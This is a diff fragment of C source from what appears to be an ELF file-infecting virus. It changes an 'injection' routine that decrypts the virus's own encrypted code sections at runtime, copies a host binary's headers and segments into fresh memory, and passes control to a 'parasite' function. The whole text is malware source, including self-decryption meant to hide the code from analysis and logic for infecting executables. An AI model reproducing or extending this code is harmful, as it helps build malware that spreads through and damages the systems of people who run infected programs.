@@ -32,30 +32,30 @@ __attribute__((always_inline)) static inline void write_on_memory(char *dst, cha
 
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
-
 #if LOGGER
 	MID_LOGGER("injection:\t\t");
 #endif
 
+	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+
 	if (context == FAILURE)
 		goto label;
 
-	struct s_injection injection;
+	struct s_infect infect;
 
-	injection.filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;
+	infect.filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;
 
-	if ((injection.ptr = _mmap(NULL, injection.filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+	if ((infect.ptr = _mmap(NULL, infect.filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 	{
 		context = FAILURE;
 		goto label;
 	}
 
-	write_on_memory(injection.ptr, (char *)host->header, host->segment);
+	write_on_memory(infect.ptr, (char *)host->header, host->segment);
 
 label:
-//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
-//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
+	update_keychain_left(keychain, (char *)injection, (void *)parasite - (void *)injection);
+	decrypt_left(keychain, (char *)parasite, (void *)stub - (void *)parasite);
 
-	parasite(host, keychain, context, &injection);
+	parasite(host, keychain, context, &infect);
 }
